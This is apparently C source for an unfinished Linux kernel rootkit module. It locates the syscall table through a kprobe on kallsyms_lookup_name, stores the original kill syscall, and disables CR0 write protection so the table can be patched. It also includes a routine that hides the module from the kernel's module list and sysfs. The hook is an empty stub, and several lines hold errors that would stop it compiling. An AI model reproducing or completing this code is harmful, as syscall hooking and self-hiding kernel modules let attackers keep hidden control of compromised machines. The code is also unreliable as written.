#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/unistd.h>
#include <linux/version.h>

// Module info
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Joshua Poole");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.1");

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name_fn;

unsigned long *sys_call_table;

static unsigned long *get_syscall_table(void) {
    unsigned long *syscall_table;

#if LINUX_VERSION_CODE > KERNEL_VERSION(5, 7, 0)
    kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
    syscall_table = (unsigned long *)kallsyms_lookup_name_fn("sys_call_table");
#else
    syscall_table = NULL;
#endif

    return syscall_table;
}

#ifdef CONFIG_X86_64
/* On x86_64 architecture, rom linux version 4.17 onwards, system call functions are not called within the kernel,
rather, are called using struct pt_regs, which is a syscall wrapper*/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)

// If we are in here, we need to use pt_regs to hook into syscalls
#define PTREGS_SYSCALL_STUB 1
// Function pointer to a syscall function
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs)
// syscalls
static ptregs_t orig_kill;

#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;
#endif
#endif

static int store_original_syscalls(void) {
#if PT_REGS_SYSCALL_STUB
    orig_kill = (pt_regs_t)sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");
#else
    orig_kill = (orig_kill_t)sys_call_table[__NR_kill];
    printk(KERN_INFO "orig_kill table entry successfully stored\n");
#endif

    return 0;
}

static int hide_module(void) {
    printk(KERN_INFO "Hiding module" THIS_MODULE->name);
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    return 0;
}

/* NOTE: THE FOLLOWING THREE FUNCTIONS ARE TAKEN FROM THIS SOURCE:
https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html*/
// These functions are used to modify the cr0 register in the CPU, whos 16th bit is the write protection (WP) bit
// This allows processes to write into read-only pages, including the syscall table!!
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    write_cr0_forced(read_cr0());
    printk(KERN_INFO "protected memory\n");
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & ~0x00010000);
    printk(KERN_INFO "unprotected memory\n");
}
/* NOTE: THE PREVIOUS THREE FUNCTIONS ARE TAKEN FROM THIS SOURCE:
https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html*/

static int hook(void) {
    return 0;
}

static int __init mod_init(void) {
    int err = 1;
    printk(KERN_INFO "rootkit: init\n");

    register_kprobe(&kp);

    sys_call_table = get_syscall_table();

    if (!sys_call_table) {
        printk(KERN_INFO "error: sys_call_table == NULL");
        return err;
    }

    // hide_module();
    return 0;
}

static void __exit mod_exit(void) {
    int err = 1;
    printk(KERN_INFO "rootkit: exit\n");
    unregister_kprobe(&kp);
}

module_init(mod_init);
module_exit(mod_exit);